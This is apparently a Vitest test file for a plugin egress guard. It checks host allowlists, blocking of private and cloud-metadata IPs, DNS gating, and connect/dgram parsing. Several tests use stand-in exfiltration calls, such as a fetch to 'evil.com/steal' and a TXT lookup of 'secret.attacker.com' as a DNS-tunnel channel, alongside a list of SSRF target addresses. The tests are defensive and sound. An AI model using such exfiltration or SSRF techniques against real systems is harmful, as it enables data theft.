import { describe, it, expect, afterEach } from 'vitest';
import {
  makeHostAllow, isBlockedIp, classifyConnect, unwrapConnectArgs, dgramSendTarget, dgramConnectTarget,
  installEgressGuard, type RestoreEgress,
} from '../src/egress-policy.js';

describe('makeHostAllow', () => {
  it('matches an exact host only', () => {
    const allow = makeHostAllow(['api.example.com']);
    expect(allow('api.example.com')).toBe(true);
    expect(allow('API.Example.COM')).toBe(true); // case-insensitive
    expect(allow('api.example.com.')).toBe(true); // trailing-dot FQDN
    expect(allow('evil.com')).toBe(false);
    expect(allow('notapi.example.com')).toBe(false);
  });

  it('matches subdomains (and the apex) for a *.suffix wildcard', () => {
    const allow = makeHostAllow(['*.example.com']);
    expect(allow('a.example.com')).toBe(true);
    expect(allow('deep.nested.example.com')).toBe(true);
    expect(allow('example.com')).toBe(true); // the apex itself
    expect(allow('example.com.evil.net')).toBe(false);
  });

  it('refuses the allow-all patterns — a bare * and a whole-TLD wildcard', () => {
    expect(makeHostAllow(['*'])('anything.com')).toBe(false);
    expect(makeHostAllow(['*.com'])('anything.com')).toBe(false);
    expect(makeHostAllow(['*.'])('anything.com')).toBe(false);
  });

  it('with no declared hosts, nothing is allowed — as in production', () => {
    const allow = makeHostAllow([]);
    expect(allow('example.com')).toBe(false);
    expect(allow('localhost')).toBe(false);
  });
});

describe('isBlockedIp', () => {
  it.each([
    '127.0.0.1', '10.0.0.5', '172.16.0.1', '172.31.255.255', '192.168.1.1',
    '169.254.169.254', // cloud metadata — the SSRF prize
    '100.64.0.1', '0.0.0.0', '224.0.0.1',
  ])('blocks %s', (ip) => expect(isBlockedIp(ip)).toBe(true));

  it.each(['8.8.8.8', '1.1.1.1', '172.32.0.1', '192.169.0.1', '99.1.2.3'])(
    'allows public %s', (ip) => expect(isBlockedIp(ip)).toBe(false),
  );

  it('blocks every spelling of an IPv6 loopback/metadata address', () => {
    expect(isBlockedIp('::1')).toBe(true);
    expect(isBlockedIp('::')).toBe(true);
    expect(isBlockedIp('fe80::1')).toBe(true); // link-local
    expect(isBlockedIp('fc00::1')).toBe(true); // ULA
    expect(isBlockedIp('::ffff:127.0.0.1')).toBe(true); // IPv4-mapped, dotted
    expect(isBlockedIp('::ffff:a9fe:a9fe')).toBe(true); // IPv4-mapped metadata, hex
    expect(isBlockedIp('[::ffff:169.254.169.254]')).toBe(true); // bracketed
    expect(isBlockedIp('2606:4700::1111')).toBe(false); // public v6
  });
});

describe('connect / dgram argument parsing', () => {
  const isIP = (s: string) => /^\d+\.\d+\.\d+\.\d+$/.test(s);

  it('unwraps the pre-normalised [options, cb] array net.connect() passes', () => {
    const opts = { host: 'a.com', port: 80 };
    expect(unwrapConnectArgs([[opts, () => {}]])).toEqual([opts, expect.any(Function)]);
    expect(unwrapConnectArgs([opts])).toEqual([opts]);
  });

  it('classifies every connect() overload', () => {
    expect(classifyConnect([{ host: 'a.com', port: 443 }], isIP)).toEqual({ kind: 'hostname', host: 'a.com' });
    expect(classifyConnect([{ host: '1.2.3.4' }], isIP)).toEqual({ kind: 'literal-ip', host: '1.2.3.4' });
    expect(classifyConnect([{ path: '/var/run/docker.sock' }], isIP)).toEqual({ kind: 'local', host: '/var/run/docker.sock' });
    expect(classifyConnect(['/tmp/x.sock'], isIP)).toEqual({ kind: 'local', host: '/tmp/x.sock' });
    expect(classifyConnect([443, 'a.com'], isIP)).toEqual({ kind: 'hostname', host: 'a.com' });
    expect(classifyConnect([443], isIP)).toEqual({ kind: 'hostname', host: 'localhost' });
    // the plain-HTTP path undici takes — misparsing this once made every HTTP call
    // look like a connect to "localhost"
    expect(classifyConnect([[{ host: 'a.com', port: 80 }, () => {}]], isIP)).toEqual({ kind: 'hostname', host: 'a.com' });
  });

  it('finds the dgram destination in both send() overloads', () => {
    expect(dgramSendTarget(['msg', 514, 'logs.example.com'])).toBe('logs.example.com');
    expect(dgramSendTarget(['msg', 0, 3, 514, 'logs.example.com'])).toBe('logs.example.com'); // (offset,length) form
    expect(dgramSendTarget(['msg', 514])).toBeNull(); // no explicit address
    expect(dgramConnectTarget([514, 'logs.example.com'])).toBe('logs.example.com');
    expect(dgramConnectTarget([514])).toBeNull();
  });
});

describe('installEgressGuard', () => {
  let restore: RestoreEgress | null = null;
  afterEach(() => { restore?.(); restore = null; });

  it('rejects a fetch to an undeclared host, and names the permission to add', async () => {
    restore = installEgressGuard(['api.example.com']);
    await expect(fetch('https://evil.com/steal')).rejects.toThrow(/evil\.com is not in the plugin's declared hosts/);
    await expect(fetch('https://evil.com/steal')).rejects.toThrow(/http:outbound:evil\.com/);
  });

  it('blocks ALL outbound when no host is declared — as in production', async () => {
    restore = installEgressGuard([]);
    await expect(fetch('https://api.example.com')).rejects.toThrow(/not in the plugin's declared hosts/);
  });

  it('rejects a malformed url rather than passing it through', async () => {
    restore = installEgressGuard(['api.example.com']);
    await expect(fetch('not-a-url')).rejects.toThrow(/egress: invalid url/);
  });

  it('lets a declared host through to the real fetch (it delegates, never resolves)', async () => {
    restore = installEgressGuard(['api.example.com']);
    // Port 1 will never connect, so this rejects either way — what matters is WHICH error.
    // An egress refusal would mean the guard blocked a host it was told to allow.
    const err = await fetch('http://api.example.com:1/').catch((e: Error) => e.message);
    expect(err).not.toMatch(/declared hosts/);
    expect(err).toMatch(/fetch failed|ECONNREFUSED/);
  });

  it('gates a DNS lookup for an undeclared name (the DNS-tunnel channel)', async () => {
    restore = installEgressGuard(['api.example.com']);
    const dns = await import('node:dns');
    await expect(dns.promises.resolveTxt('secret.attacker.com')).rejects.toThrow(/DNS lookup for secret\.attacker\.com/);
  });

  // Regression: gating literal IPs too broke the dev server's OWN listener — Node
  // resolves a bind address through dns.lookup, so `listen(port, '127.0.0.1')` was
  // refused by its own guard and dev could not start. An IP has no name to tunnel
  // data in; reaching it is still barred by the connect guard + isBlockedIp.
  it('does NOT gate a lookup of a literal IP (the dev server binds through dns.lookup)', async () => {
    restore = installEgressGuard([]); // nothing declared: the strictest possible policy
    const dns = await import('node:dns');
    await expect(dns.promises.lookup('127.0.0.1')).resolves.toMatchObject({ address: '127.0.0.1' });
  });

  it('still refuses to CONNECT to a blocked literal IP', async () => {
    restore = installEgressGuard(['1.2.3.4']);
    const net = await import('node:net');
    // Declared, but private — the SSRF backstop outranks the allowlist.
    expect(() => new net.Socket().connect({ host: '127.0.0.1', port: 1 })).toThrow(/blocked address|declared hosts/);
  });

  it('restores the real fetch and dns on teardown', async () => {
    const realFetch = globalThis.fetch;
    const dns = await import('node:dns');
    const realResolve = dns.promises.resolveTxt;
    const undo = installEgressGuard(['api.example.com']);
    expect(globalThis.fetch).not.toBe(realFetch);
    undo();
    expect(globalThis.fetch).toBe(realFetch);
    expect(dns.promises.resolveTxt).toBe(realResolve);
  });
});
